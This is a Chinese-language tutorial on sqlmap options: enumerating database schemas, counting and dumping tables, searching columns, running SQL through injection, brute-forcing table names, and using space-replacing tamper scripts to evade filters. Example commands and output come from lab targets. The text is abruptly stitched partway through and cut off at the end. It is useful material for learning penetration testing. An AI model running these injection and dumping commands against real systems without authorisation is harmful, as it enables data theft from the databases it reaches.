    Database: SQLite_masterdb
    Table: users
    [3 columns]
    +---------+---------+
    | Column  | Type|
    +---------+---------+
    | id  | INTEGER |
    | name| TEXT|
    | surname | TEXT|
    +---------+---------+
**列举数据库系统的架构**
参数：`–schema,–exclude-sysdbs`
用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。
加上`–exclude-sysdbs`参数，将不会获取数据库自带的系统库内容。
MySQL例子：
    $ python sqlmap.py -u "http://*******/sqlmap/mysql/get_int.php?id=1" --schema --batch --exclude-sysdbs
    [...]
    Database: owasp10
    Table: accounts
    [4 columns]
    +-------------+---------+
    | Column  | Type|
    +-------------+---------+
    | cid | int(11) |
    | mysignature | text|
    | password| text|
    | username| text|
    +-------------+---------+
    Database: owasp10
    Table: blogs_table
    [4 columns]
    +--------------+----------+
    | Column   | Type |
    +--------------+----------+
    | date | datetime |
    | blogger_name | text |
    | cid  | int(11)  |
    | comment  | text |
    +--------------+----------+
    Database: owasp10
    Table: hitlog
    [6 columns]
    +----------+----------+
    | Column   | Type |
    +----------+----------+
    | date | datetime |
    | browser  | text |
    | cid  | int(11)  |
    | hostname | text |
    | ip   | text |
    | referer  | text |
    +----------+----------+
    Database: testdb
    Table: users
    [3 columns]
    +---------+---------------+
    | Column  | Type  |
    +---------+---------------+
    | id  | int(11)   |
    | name| varchar(500)  |
    | surname | varchar(1000) |
    +---------+---------------+
    [...]
**获取表中数据个数**
参数：`–count`
有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。
列举一个`Microsoft SQL Server`例子：
    $ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --count -D testdb
    [...]
    Database: testdb
    +----------------+---------+
    | Table  | Entries |
    +----------------+---------+
    | dbo.users  | 4   |
    | dbo.users_blob | 2   |
    +----------------+---------+
**获取整个表的数据**
参数：`–dump,-C,-T,-D,–start,–stop,–first,–last`
如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。
使用`-D,-T`参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。
列举一个`Firebird`的例子：
    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users
    [...]
    Database: Firebird_masterdb
    Table: USERS
    [4 entries]
    +----+--------+------------+
    | ID | NAME   | SURNAME|
    +----+--------+------------+
    | 1  | luther | blisset|
    | 2  | fluffy | bunny  |
    | 3  | wu | ming   |
    | 4  | NULL   | nameisnull |
    +----+--------+------------+
可以获取指定库中的所有表的内容，只用`-dump`跟`-D`参数（不使用-T与-C参数）。
也可以用-dump跟-C获取指定的字段内容。
sqlmap为每个表生成了一个CSV文件。
如果你只想获取一段数据，可以使用–start和–stop参数，例如，你只想获取第一段数据可hi使用–stop
1，如果想获取第二段与第三段数据，使用参数 –start 1 –stop 3。
也可以用`–first与–last`参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用–first
3:–last
4:只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。
**获取所有数据库表的内容**
参数：`–dump-all,–exclude-sysdbs`
使用`–dump-all`参数获取所有数据库表的内容，可同时加上`–exclude-sysdbs`只获取用户数据库的表，
需要注意在`Microsoft SQL`  
`Server`中`master`数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。
**搜索字段，表，数据库**
参数：`–search,-C,-T,-D`
`–search`可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。
可以在一下三种情况下使用：
    -C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。
    -T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名
    -D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。
**运行自定义的SQL语句**
参数：`–sql-query,–sql-shell`
`sqlmap`会自动检测确定使用哪种SQL注入技术，如何插入检索语句。
如果是`SELECT`查询语句，`sqlap`将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。
列举一个`Mircrosoft SQL Server 2000`的例子：
    $ python sqlmap.py -u "http://**********/sqlmap/mssql/get_int.php?id=1"
    --sql-query "SELECT 'foo'" -v 1
    [...]
    [hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''
    [hh:mm:14] [INFO] retrieved: foo
    SELECT 'foo': 'foo'
    \$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1"
    --sql-query "SELECT 'foo', 'bar'" -v 2
    [...]
    [hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
    [hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now
    unpack it into
    distinct queries to be able to retrieve the output even if we are going blind
    [hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS
    VARCHAR(8000)),
    (CHAR(32)))
    [hh:mm:50] [INFO] retrieved: foo
    [hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
    [hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS
    VARCHAR(8000)),
    (CHAR(32)))
    [hh:mm:50] [INFO] retrieved: bar
    [hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
    SELECT 'foo', 'bar': 'foo, bar'
#### 爆破
**暴力破解表名**
参数：`–common-tables`
当使用`–tables`无法获取到数据库的表时，可以使用此参数。
通常是如下情况：
    1. `MySQL`数据库版本小于5.0，没有`information_schema`表。
    2. 数据库是`Microssoft Access`，系统表`MSysObjects`是不可读的（默认）。
    3. 当前用户没有权限读取系统中保存数据结构的表的权限。
暴力破解的表在`txt/common-tables.txt`文件中，你可以自己添加。
列举一个MySQL 4.1的例子：
    $ python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner
    [...]
    [hh:mm:39] [INFO] testing MySQL
    [hh:mm:39] [INFO] confirming MySQL
    [hh:mm:40] [INFO] the back-end DBMS is MySQL
    [hh:mm:40] [INFO] fetching banner
    web server operating system: Windows
    web application technology: PHP 5.3.1, Apache 2.2.14
    back-end DBMS operating system: Windows
    back-end DBMS: MySQL = 5.1.13 Tested
    针对此做过测试: 
    * MySQL 5.1.41
    #### space2mssqlblank.py
    作用：空格替换为其它空符号
    示例：
    ```sql
    SELECT id FROM users 
    SELECT%08id%02FROM%0Fusers
版本要求:
    Microsoft SQL Server
    在以下版本做过测试:
    Microsoft SQL Server 2000
    Microsoft SQL Server 2005
**4:space2mysqlblank.py**
作用：空格替换其它空白符号
示例：
    SELECT id FROM users 
    SELECT%0Bid%0BFROM%A0users
版本要求:
    MySQL
    在以下版本做过测试:
    MySQL 5.1
**5:space2mssqlhash.py**
作用：替换空格
示例：
    '1 AND 9227=9227'